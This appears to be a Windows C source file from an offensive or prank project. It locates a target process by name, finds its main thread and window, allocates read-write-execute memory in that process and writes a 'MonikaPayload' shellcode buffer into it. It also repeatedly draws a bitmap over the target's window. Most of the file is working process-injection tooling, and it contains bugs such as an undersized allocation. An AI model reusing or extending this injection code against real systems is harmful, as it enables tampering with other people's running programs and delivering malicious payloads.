#include "pch.h"

extern "C"
{
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <Windows.h>
#include <tlhelp32.h>

// Function to get the PID of the target process by name
DWORD GetProcessIdByName(const char* processName)
{
    // First convert processName to wide char
    size_t processNameLen = strlen(processName) + 1;
    wchar_t* processNameW = (wchar_t*)malloc(processNameLen * sizeof(wchar_t));
    mbstowcs(processNameW, processName, processNameLen);
    // lowercase the process name
    for (size_t i = 0; i < processNameLen; i++)
    {
        if (processNameW[i] >= 'A' && processNameW[i] <= 'Z')
            processNameW[i] += 32;
    }

    DWORD processId = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return 0;

    if (Process32First(hProcessSnap, &pe32))
    {
        do
        {
            // lowercase the process name
            for (size_t i = 0; i < MAX_PATH; i++)
            {
                if (pe32.szExeFile[i] >= 'A' && pe32.szExeFile[i] <= 'Z')
                    pe32.szExeFile[i] += 32;
            }
            if (wcscmp(pe32.szExeFile, processNameW) == 0)
            {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return processId;
}

// Function to find the main thread of the target process
DWORD GetMainThreadId(DWORD processId)
{
    DWORD mainThreadId = 0;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return NULL;

    FILETIME earliestTime = { MAXDWORD, MAXDWORD };

    if (Thread32First(hThreadSnap, &te32))
    {
        do
        {
            if (te32.th32OwnerProcessID == processId)
            {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
                if (hThread)
                {
                    FILETIME creationTime, exitTime, kernelTime, userTime;
                    if (GetThreadTimes(hThread, &creationTime, &exitTime, &kernelTime, &userTime))
                    {
                        if (CompareFileTime(&creationTime, &earliestTime) < 0)
                        {
                            earliestTime = creationTime;
                            mainThreadId = te32.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}

// Function to inject MonikaPayload into the target process and return the address of the remote memory
LPVOID InjectShellcode(HANDLE hProcess, UINT8 *buf, UINT64 bufsize)
{
    if (!hProcess)
    {
        printf("Invalid process handle\n");
        return NULL;
    }
    // Allocate memory in the target process
    LPVOID remotePayloadMemory = VirtualAllocEx(hProcess, NULL, sizeof(bufsize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotePayloadMemory)
    {
        printf("Failed to allocate memory in the target process\n");
        return NULL;
    }
    printf("Allocated RWX memory at address: 0x%p\n", remotePayloadMemory);
    // Write the MonikaPayload to the allocated memory
    WriteProcessMemory(hProcess, remotePayloadMemory, buf, bufsize, NULL);
    return remotePayloadMemory;
}

static HWND targetHwnd = NULL;
static DWORD targetPID = 0;

static BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam)
{
    targetHwnd = NULL;

    DWORD currentPID;
    GetWindowThreadProcessId(hwnd, &currentPID);

    if (currentPID == targetPID)
    {
        // We found a window that belongs to the target process
        targetHwnd = hwnd;
        return FALSE; // Stop enumeration
    }
    
    return TRUE; // Continue enumeration
}

HWND GetTargetWindowHandleByPID(DWORD processId)
{
    targetPID = processId;
    EnumWindows(EnumWindowsCallback, 0);
    return targetHwnd;
}


typedef struct
{
    const char *bmp_path;
    HWND hwnd;
} MonikaRender;

// Function to draw an image on a window using GDI
void DrawImageOnWindow_Worker(MonikaRender *RenderInfo)
{
    HWND shadow_hwnd = RenderInfo->hwnd;
    // Load an image from file (use LoadImage for simplicity)
    HBITMAP hBitmap = (HBITMAP)LoadImageA(NULL, RenderInfo->bmp_path, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
    if (!hBitmap)
    {
        printf("Failed to load image.\n");
        return;
    }
    // Get the bitmap dimensions
    BITMAP bmp_info;
    GetObject(hBitmap, sizeof(BITMAP), &bmp_info);

    renderLoop:

    // Get the device context (DC) of the target window
    HDC hdc = GetDC(shadow_hwnd);
    if (!hdc)
    {
        printf("Failed to get device context.\n");
        DeleteObject(hBitmap);
        return;
    }

    // Create a memory DC to hold the bitmap
    HDC memDC = CreateCompatibleDC(hdc);
    if (!memDC)
    {
        printf("Failed to create memory DC.\n");
        ReleaseDC(shadow_hwnd, hdc);
        DeleteObject(hBitmap);
        return;
    }

    // Select the bitmap into the memory DC, this will change memDC mapping area to the bmp file content
    SelectObject(memDC, hBitmap);

    // BitBlt (copy) the image from the memory DC to the window DC
    BitBlt(hdc, 0, 0, bmp_info.bmWidth, bmp_info.bmHeight, memDC, 0, 0, SRCCOPY);

    //printf("Image drawn on window\n");
    
    // Clean up
    DeleteDC(memDC);
    ReleaseDC(shadow_hwnd, hdc);

    // Sleep for 1 second
    Sleep(1000);

    goto renderLoop;
}

void DrawImageOnWindow(HWND hwnd, const char* imageFile)
{
    MonikaRender RenderInfo;
    RenderInfo.bmp_path = imageFile;
    RenderInfo.hwnd = hwnd;

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DrawImageOnWindow_Worker, (LPVOID)&RenderInfo, 0, NULL);
    // Wait 100 ms for Worker Thread copy parameters to its own heap
    Sleep(100);

    // Once we return, our heap will be rewrite by another function...
}
}